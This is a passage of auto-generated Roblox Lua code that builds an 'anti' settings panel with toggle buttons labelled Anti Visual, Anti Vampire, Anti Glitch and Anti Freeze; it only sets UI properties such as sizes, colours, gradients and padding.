-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---
G2L["1d8"] = Instance.new("Frame", G2L["1c1"]);
G2L["1d8"]["BorderSizePixel"] = 0;
G2L["1d8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d8"]["Size"] = UDim2.new(1, 0, 0, 10);
G2L["1d8"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1d8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d8"]["Name"] = [[---DIVIDER---]];
G2L["1d8"]["LayoutOrder"] = 3;
G2L["1d8"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame
G2L["1d9"] = Instance.new("Frame", G2L["1d8"]);
G2L["1d9"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["1d9"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["1d9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1d9"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["1d9"]["Name"] = [[dividerFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.outlineStroke
G2L["1da"] = Instance.new("UIStroke", G2L["1d9"]);
G2L["1da"]["Thickness"] = 2;
G2L["1da"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade
G2L["1db"] = Instance.new("CanvasGroup", G2L["1d9"]);
G2L["1db"]["BorderSizePixel"] = 0;
G2L["1db"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1db"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1db"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1db"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1db"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
G2L["1dc"] = Instance.new("UIGradient", G2L["1db"]);
G2L["1dc"]["Rotation"] = 90;
G2L["1dc"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.UIStroke
G2L["1dd"] = Instance.new("UIStroke", G2L["1d9"]);
G2L["1dd"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["1dd"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.UICorner
G2L["1de"] = Instance.new("UICorner", G2L["1d9"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.UIPadding
G2L["1df"] = Instance.new("UIPadding", G2L["1d8"]);
G2L["1df"]["PaddingTop"] = UDim.new(0, 3);
G2L["1df"]["PaddingRight"] = UDim.new(0, 6);
G2L["1df"]["PaddingLeft"] = UDim.new(0, 6);
G2L["1df"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual
G2L["1e0"] = Instance.new("Frame", G2L["1c1"]);
G2L["1e0"]["BorderSizePixel"] = 0;
G2L["1e0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e0"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["1e0"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1e0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e0"]["Name"] = [[visual]];
G2L["1e0"]["LayoutOrder"] = 2;
G2L["1e0"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button
G2L["1e1"] = Instance.new("TextButton", G2L["1e0"]);
G2L["1e1"]["BorderSizePixel"] = 0;
G2L["1e1"]["TextTransparency"] = 1;
G2L["1e1"]["TextSize"] = 14;
G2L["1e1"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1e1"]["BackgroundTransparency"] = 1;
G2L["1e1"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["1e1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e1"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button.UIPadding
G2L["1e2"] = Instance.new("UIPadding", G2L["1e1"]);
G2L["1e2"]["PaddingTop"] = UDim.new(0, 3);
G2L["1e2"]["PaddingRight"] = UDim.new(0, 3);
G2L["1e2"]["PaddingLeft"] = UDim.new(0, 3);
G2L["1e2"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button.toggleFrame
G2L["1e3"] = Instance.new("Frame", G2L["1e1"]);
G2L["1e3"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["1e3"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["1e3"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1e3"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["1e3"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button.toggleFrame.outlineStroke
G2L["1e4"] = Instance.new("UIStroke", G2L["1e3"]);
G2L["1e4"]["Thickness"] = 2;
G2L["1e4"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button.toggleFrame.toggleFade
G2L["1e5"] = Instance.new("CanvasGroup", G2L["1e3"]);
G2L["1e5"]["BorderSizePixel"] = 0;
G2L["1e5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e5"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e5"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1e5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e5"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.button.toggleFrame.toggleFade.UIGradient
G2L["1e6"] = Instance.new("UIGradient", G2L["1e5"]);
G2L["1e6"]["Rotation"] = 90;
G2L["1e6"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.text
G2L["1e7"] = Instance.new("TextLabel", G2L["1e0"]);
G2L["1e7"]["TextWrapped"] = true;
G2L["1e7"]["BorderSizePixel"] = 0;
G2L["1e7"]["TextSize"] = 14;
G2L["1e7"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1e7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1e7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e7"]["BackgroundTransparency"] = 1;
G2L["1e7"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["1e7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e7"]["Text"] = [[Anti Visual]];
G2L["1e7"]["Name"] = [[text]];
G2L["1e7"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.text.UIPadding
G2L["1e8"] = Instance.new("UIPadding", G2L["1e7"]);
G2L["1e8"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.text.text
G2L["1e9"] = Instance.new("UIStroke", G2L["1e7"]);
G2L["1e9"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.visual.UIPadding
G2L["1ea"] = Instance.new("UIPadding", G2L["1e0"]);
G2L["1ea"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire
G2L["1eb"] = Instance.new("Frame", G2L["1c1"]);
G2L["1eb"]["BorderSizePixel"] = 0;
G2L["1eb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1eb"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["1eb"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1eb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1eb"]["Name"] = [[vampire]];
G2L["1eb"]["LayoutOrder"] = 2;
G2L["1eb"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button
G2L["1ec"] = Instance.new("TextButton", G2L["1eb"]);
G2L["1ec"]["BorderSizePixel"] = 0;
G2L["1ec"]["TextTransparency"] = 1;
G2L["1ec"]["TextSize"] = 14;
G2L["1ec"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ec"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1ec"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1ec"]["BackgroundTransparency"] = 1;
G2L["1ec"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["1ec"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1ec"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button.UIPadding
G2L["1ed"] = Instance.new("UIPadding", G2L["1ec"]);
G2L["1ed"]["PaddingTop"] = UDim.new(0, 3);
G2L["1ed"]["PaddingRight"] = UDim.new(0, 3);
G2L["1ed"]["PaddingLeft"] = UDim.new(0, 3);
G2L["1ed"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button.toggleFrame
G2L["1ee"] = Instance.new("Frame", G2L["1ec"]);
G2L["1ee"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["1ee"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["1ee"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1ee"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["1ee"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button.toggleFrame.outlineStroke
G2L["1ef"] = Instance.new("UIStroke", G2L["1ee"]);
G2L["1ef"]["Thickness"] = 2;
G2L["1ef"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button.toggleFrame.toggleFade
G2L["1f0"] = Instance.new("CanvasGroup", G2L["1ee"]);
G2L["1f0"]["BorderSizePixel"] = 0;
G2L["1f0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f0"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f0"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1f0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f0"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.button.toggleFrame.toggleFade.UIGradient
G2L["1f1"] = Instance.new("UIGradient", G2L["1f0"]);
G2L["1f1"]["Rotation"] = 90;
G2L["1f1"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.text
G2L["1f2"] = Instance.new("TextLabel", G2L["1eb"]);
G2L["1f2"]["TextWrapped"] = true;
G2L["1f2"]["BorderSizePixel"] = 0;
G2L["1f2"]["TextSize"] = 14;
G2L["1f2"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1f2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f2"]["BackgroundTransparency"] = 1;
G2L["1f2"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["1f2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f2"]["Text"] = [[Anti Vampire]];
G2L["1f2"]["Name"] = [[text]];
G2L["1f2"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.text.UIPadding
G2L["1f3"] = Instance.new("UIPadding", G2L["1f2"]);
G2L["1f3"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.text.text
G2L["1f4"] = Instance.new("UIStroke", G2L["1f2"]);
G2L["1f4"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.vampire.UIPadding
G2L["1f5"] = Instance.new("UIPadding", G2L["1eb"]);
G2L["1f5"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch
G2L["1f6"] = Instance.new("Frame", G2L["1c1"]);
G2L["1f6"]["BorderSizePixel"] = 0;
G2L["1f6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f6"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["1f6"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["1f6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f6"]["Name"] = [[glitch]];
G2L["1f6"]["LayoutOrder"] = 2;
G2L["1f6"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button
G2L["1f7"] = Instance.new("TextButton", G2L["1f6"]);
G2L["1f7"]["BorderSizePixel"] = 0;
G2L["1f7"]["TextTransparency"] = 1;
G2L["1f7"]["TextSize"] = 14;
G2L["1f7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f7"]["BackgroundTransparency"] = 1;
G2L["1f7"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["1f7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f7"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button.UIPadding
G2L["1f8"] = Instance.new("UIPadding", G2L["1f7"]);
G2L["1f8"]["PaddingTop"] = UDim.new(0, 3);
G2L["1f8"]["PaddingRight"] = UDim.new(0, 3);
G2L["1f8"]["PaddingLeft"] = UDim.new(0, 3);
G2L["1f8"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button.toggleFrame
G2L["1f9"] = Instance.new("Frame", G2L["1f7"]);
G2L["1f9"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["1f9"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["1f9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1f9"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["1f9"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button.toggleFrame.outlineStroke
G2L["1fa"] = Instance.new("UIStroke", G2L["1f9"]);
G2L["1fa"]["Thickness"] = 2;
G2L["1fa"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button.toggleFrame.toggleFade
G2L["1fb"] = Instance.new("CanvasGroup", G2L["1f9"]);
G2L["1fb"]["BorderSizePixel"] = 0;
G2L["1fb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1fb"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1fb"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["1fb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1fb"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.button.toggleFrame.toggleFade.UIGradient
G2L["1fc"] = Instance.new("UIGradient", G2L["1fb"]);
G2L["1fc"]["Rotation"] = 90;
G2L["1fc"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.text
G2L["1fd"] = Instance.new("TextLabel", G2L["1f6"]);
G2L["1fd"]["TextWrapped"] = true;
G2L["1fd"]["BorderSizePixel"] = 0;
G2L["1fd"]["TextSize"] = 14;
G2L["1fd"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1fd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1fd"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1fd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1fd"]["BackgroundTransparency"] = 1;
G2L["1fd"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["1fd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1fd"]["Text"] = [[Anti Glitch]];
G2L["1fd"]["Name"] = [[text]];
G2L["1fd"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.text.UIPadding
G2L["1fe"] = Instance.new("UIPadding", G2L["1fd"]);
G2L["1fe"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.text.text
G2L["1ff"] = Instance.new("UIStroke", G2L["1fd"]);
G2L["1ff"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.glitch.UIPadding
G2L["200"] = Instance.new("UIPadding", G2L["1f6"]);
G2L["200"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze
G2L["201"] = Instance.new("Frame", G2L["1c1"]);
G2L["201"]["BorderSizePixel"] = 0;
G2L["201"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["201"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["201"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["201"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["201"]["Name"] = [[freeze]];
G2L["201"]["LayoutOrder"] = 5;
G2L["201"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button
G2L["202"] = Instance.new("TextButton", G2L["201"]);
G2L["202"]["BorderSizePixel"] = 0;
G2L["202"]["TextTransparency"] = 1;
G2L["202"]["TextSize"] = 14;
G2L["202"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["202"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["202"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["202"]["BackgroundTransparency"] = 1;
G2L["202"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["202"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["202"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button.UIPadding
G2L["203"] = Instance.new("UIPadding", G2L["202"]);
G2L["203"]["PaddingTop"] = UDim.new(0, 3);
G2L["203"]["PaddingRight"] = UDim.new(0, 3);
G2L["203"]["PaddingLeft"] = UDim.new(0, 3);
G2L["203"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button.toggleFrame
G2L["204"] = Instance.new("Frame", G2L["202"]);
G2L["204"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["204"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["204"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["204"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["204"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button.toggleFrame.outlineStroke
G2L["205"] = Instance.new("UIStroke", G2L["204"]);
G2L["205"]["Thickness"] = 2;
G2L["205"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button.toggleFrame.toggleFade
G2L["206"] = Instance.new("CanvasGroup", G2L["204"]);
G2L["206"]["BorderSizePixel"] = 0;
G2L["206"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["206"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["206"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["206"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["206"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.button.toggleFrame.toggleFade.UIGradient
G2L["207"] = Instance.new("UIGradient", G2L["206"]);
G2L["207"]["Rotation"] = 90;
G2L["207"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.text
G2L["208"] = Instance.new("TextLabel", G2L["201"]);
G2L["208"]["TextWrapped"] = true;
G2L["208"]["BorderSizePixel"] = 0;
G2L["208"]["TextSize"] = 14;
G2L["208"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["208"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["208"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["208"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["208"]["BackgroundTransparency"] = 1;
G2L["208"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["208"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["208"]["Text"] = [[Anti Freeze]];
G2L["208"]["Name"] = [[text]];
G2L["208"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.text.UIPadding
G2L["209"] = Instance.new("UIPadding", G2L["208"]);
G2L["209"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.text.text
G2L["20a"] = Instance.new("UIStroke", G2L["208"]);
G2L["20a"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.UIPadding
G2L["20b"] = Instance.new("UIPadding", G2L["201"]);
G2L["20b"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible
G2L["20c"] = Instance.new("Frame", G2L["1c1"]);
G2L["20c"]["BorderSizePixel"] = 0;
G2L["20c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20c"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["20c"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["20c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20c"]["Name"] = [[invisible]];
G2L["20c"]["LayoutOrder"] = 5;
G2L["20c"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button
G2L["20d"] = Instance.new("TextButton", G2L["20c"]);
G2L["20d"]["BorderSizePixel"] = 0;
G2L["20d"]["TextTransparency"] = 1;
G2L["20d"]["TextSize"] = 14;
G2L["20d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["20d"]["BackgroundTransparency"] = 1;
G2L["20d"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["20d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20d"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.UIPadding
G2L["20e"] = Instance.new("UIPadding", G2L["20d"]);
G2L["20e"]["PaddingTop"] = UDim.new(0, 3);
G2L["20e"]["PaddingRight"] = UDim.new(0, 3);
G2L["20e"]["PaddingLeft"] = UDim.new(0, 3);
G2L["20e"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.toggleFrame
G2L["20f"] = Instance.new("Frame", G2L["20d"]);
G2L["20f"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["20f"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["20f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["20f"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["20f"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.toggleFrame.outlineStroke
G2L["210"] = Instance.new("UIStroke", G2L["20f"]);
G2L["210"]["Thickness"] = 2;
G2L["210"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.toggleFrame.toggleFade
G2L["211"] = Instance.new("CanvasGroup", G2L["20f"]);
G2L["211"]["BorderSizePixel"] = 0;
G2L["211"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["211"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["211"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["211"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["211"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.toggleFrame.toggleFade.UIGradient
G2L["212"] = Instance.new("UIGradient", G2L["211"]);
G2L["212"]["Rotation"] = 90;
G2L["212"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.text
G2L["213"] = Instance.new("TextLabel", G2L["20c"]);
G2L["213"]["TextWrapped"] = true;
G2L["213"]["BorderSizePixel"] = 0;
G2L["213"]["TextSize"] = 14;
G2L["213"]["TextXAlignment"] = Enum.TextXAlignment.Left;
